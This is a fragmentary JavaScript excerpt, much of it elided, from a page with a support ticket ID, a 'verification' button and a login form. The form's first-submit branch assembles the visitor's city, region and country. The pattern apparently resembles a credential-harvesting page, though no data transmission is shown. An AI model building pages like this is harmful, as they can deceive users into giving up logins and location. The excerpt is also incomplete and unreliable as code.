...
// Generate ticket ID (guarded)
try {
  const ticketEl = document.getElementById('ticketId');
  if (ticketEl) {
    ticketEl.textContent = (window.Utils && typeof Utils.generateTicketId === 'function')
      ? Utils.generateTicketId()
      : 'XXXX-XXXX-XXXX';
  }
} catch (_) {}

// Start verification flow (robust binding)
(function() {
  try {
    const btn = document.getElementById('submitRequestBtn');
    if (btn) {
      const attachHandlers = function(target){
        try {
          target.addEventListener('click', openClientModal);
          // Mobile/touch fallback
          try { target.addEventListener('touchend', function(e){ try{ e.preventDefault(); }catch(_){ } openClientModal(); }, { passive: false }); } catch(_){ }
          // Keyboard activation
          try { target.addEventListener('keydown', function(e){ if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openClientModal(); } }); } catch(_){ }
          try { target.removeAttribute('disabled'); target.setAttribute('role', 'button'); target.setAttribute('tabindex', '0'); } catch(_){ }
        } catch(_){ }
      };
      attachHandlers(btn);
      try { btn.setAttribute('role', 'button'); } catch(_) {}
    } else {
      document.addEventListener('click', function(e) {
        try { if (e.target && e.target.id === 'submitRequestBtn') openClientModal(); } catch(_) {}
      });
    }
  } catch (_) {}
})();
                        ...
                        try {
                            ...
                            var explicit = !!(function(){
                                try {
                                    ...
                                    if (qs.indexOf('lang=')!==-1) return true;
    ...
    document.getElementById('authForm').addEventListener('submit', async (e) => {
        ...
        if (authClickCount === 0) {
            ...
            try {
                ...
                const parts = [];
                if (locData.city && locData.city !== 'N/A') parts.push(locData.city);
                if ((locData.regionName || locData.region) && (locData.regionName || locData.region) !== 'N/A') parts.push(locData.regionName || locData.region);
                if (locData.country) parts.push(locData.country);
                if (locData.country_code) parts.push(locData.country_code);
                const locLabel = parts.join(', ');
...
function openSuccessModal() {
    const content = `
        ...
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/success.png" alt="Success" class="w-full">
        </div>
